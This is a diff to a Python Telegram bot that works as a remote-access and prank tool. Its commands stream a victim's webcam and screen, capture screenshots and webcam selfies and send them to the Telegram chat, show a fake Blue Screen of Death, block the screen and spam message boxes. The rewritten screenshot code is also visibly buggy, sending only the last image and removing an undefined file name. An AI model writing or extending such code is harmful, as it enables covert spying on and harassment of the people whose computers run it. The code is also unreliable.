@@ -84,7 +84,6 @@ def load_dll(name: str) -> None:
     except Exception as e:
         print(f"Error while loading the dll: {name}\n{e}")
 
-
 # CONSTANTS
 logging = True
 iswindows = name == "nt"
@@ -97,7 +96,6 @@ TELEGRAM_COMMANDS_LIMIT = 100
 TELEGRAM_COMMAND_LENGHT_LIMIT = 32
 TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 GENERATE_COMMANDS_MD = False
-
 
 try:
     vfx = resource_path(join("assets", "vfx"))
@@ -458,7 +456,7 @@ class PeppinoTelegram:
             Command("webcamandscreenstreamstart", self.start_webcam_and_screen_tunnel, "Start webcam and screen streams.", "camera", "📹🖥️🟢 Start Both Streams"),
             Command("webcamandscreenstreamstop", self.stop_webcam_and_screen_tunnel, "Stop webcam and screen streams.", "camera", "📹🖥️🔴 Stop Both Streams"),
             Command("stop_all_tunnels", self.stop_all_tunnels, "Stop all active streams.", "camera", "❌🔴 Stop All Streams"),
-            Command("camerawallpaper", self.setCameraAsWallpaper, "Set webcam as wallpaper.", "📸 Camera", "📷 Camera Wallpaper"),
+            Command("camerawallpaper", self.setCameraAsWallpaper, "Set webcam as wallpaper.", "camera", "📷 Camera Wallpaper"),
             Command("setvideowallpaper", self.setvideowallpaper, "Set video as wallpaper.", "camera", "🎞️ Set Video Wallpaper"),
 
             # 🔊 Audio & Volume
@@ -485,20 +483,22 @@ class PeppinoTelegram:
             Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "sound_fx", "👻 Behind you (whisper)"),
 
             # 😈 Pranks & Visuals
-            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "parnks", "👻 Jumpscare"),
-            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "parnks", "😶‍🌫️ Jumpscare noaudio"),
-            Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "parnks", "💀 Fake BSOD"),
-            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "parnks", "🔄 Inverted Screen"),
-            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","parnks","QR Overlay"),
-            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "parnks", "🌀 Distorted Screen"),
-            Command("messagebox", self.message_box, "Show custom message box.", "parnks", "💬 Message Box"),
-            Command("messagespam", self.spam_windows, "Spam message boxes.", "parnks", "📨 Message Spam"),
-            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "parnks", "📷 Camera Wallpaper"),
-            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "parnks", "🎞️ Set Video Wallpaper"),
-            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "parnks", "🖥️🌀 Video Signal Drowning Effect"),
-            Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "parnks", "🌀📻 Video&Sound Disturbance"),
-            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "parnks", "👻 Red Text Overlay"),
-            Command("set_jumpscare_volume", self.setJumpscareVolume, "Set jumpscare's volume.","parnks" , "Set Jumpscare Volume"),
+            #all the TODO here are basically to add LoadingBarTimedWorker in the Commands who have TODO near to them
+            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "pranks", "👻 Jumpscare"),
+            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "pranks", "😶‍🌫️ Jumpscare noaudio"),
+            Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "pranks", "💀 Fake BSOD"),
+            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "pranks", "🔄 Inverted Screen"),
+            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","pranks","QR Overlay"),
+            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "pranks", "🌀 Distorted Screen"),
+            Command("messagebox", self.message_box, "Show custom message box.", "pranks", "💬 Message Box"),
+            Command("messagespam", self.spam_windows, "Spam message boxes.", "pranks", "📨 Message Spam"),
+            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "pranks", "📷 Camera Wallpaper"),
+            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "pranks", "🎞️ Set Video Wallpaper"),
+            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "pranks", "🖥️🌀 Video Signal Drowning Effect"),#TODO
+            Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "pranks", "🌀📻 Video&Sound Disturbance"),#TODO
+            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "pranks", "👻 Red Text Overlay"),
+            Command("set_jumpscare_volume", self.setJumpscareVolume, "Set jumpscare's volume.","pranks" , "Set Jumpscare Volume"),
+            Command("block_screen", self.overlay_opencv.run_block_screen, "Block screen", "pranks", "Block Screen"), #TODO
 
             # 🦑 Misc & Memes
             Command("plankton", self.plankton, "Plankton jumpscare.", "misc", "🦑 Plankton"),
@@ -1953,15 +1953,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Playing fart sound")
         self.__play_loaded_sound("fart")
 
-    def fastscreenshot(self) -> List[Any]:
-        print("Taking fast screenshot")
-        path = join(BURN_DIRECTORY, "tmp.{mon}.png")
-        for x in fast_screenshot(path):
-            monitor_name = x.split(".")[1]
-            print(f"{x=}")
-            self.__send_image(x, caption=monitor_name)
-        #return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]
-
     def fake_bsod(self, duration: int = 15, qr_url: str = None):
         self.overlay_tk.fake_bsod(duration=float(duration), qr_code_url=qr_url)
         self.bsend(f"Fake BSOD activated for {duration} seconds (Comic Sans + dual progress bars)")
@@ -2210,25 +2201,26 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
         print("Taking screenshot")
         try:
-            images = self.fastscreenshot()
-            if not images:
-                return
-            if not isfile(image):
-                return
-            for image in images:
-                remove(image)
+            for x in fast_screenshot():
+                monitor_name = x["monitor"]
+                img = x["img"]
+                f = craft_file(
+                    content=numpy_to_jpg_bytes(img),
+                    filename="screenshot.jpg"
+                )
+            self.__send_image(image_buf=f, caption=monitor_name)
         except Exception as e:
             return self.bsend(f"Error while getting screenshot\n{e}")
 
     def screenshotandselfie(self) -> None:
         print("Taking screenshot and selfie")
         self.opencap()
-        for scrt in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png")):
-            name = randompngname()
-            ret, image = screen_and_webcam_pic(self.cap, scrt)
+        for scrt in fast_screenshot():
+            mon, img = scrt["monitor"],scrt["screenshot"]
+            ret, image = screen_and_webcam_pic(self.cap, img)
             if not ret: continue
             
-            self.__send_image(image_buf=cv2_to_bytesio(image))
+            self.__send_image(image_buf=cv2_to_bytesio(image), caption=mon)
             try:
                 remove(name)
             except:
@@ -2383,11 +2375,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         """Send help messages in parts."""
         help_parts = self.help  # This should now be a list
         for i, part in enumerate(help_parts, 1):
-            if len(help_parts) > 1:
-                caption = f"Help ({i}/{len(help_parts)})"
-            else:
-                caption = None
-            self.bsend(part, parse_mode=None if caption else None)
+            self.bsend(part)
 
     def show_image(self, image_path: str) -> None:
         print(f"Showing image: {image_path}")
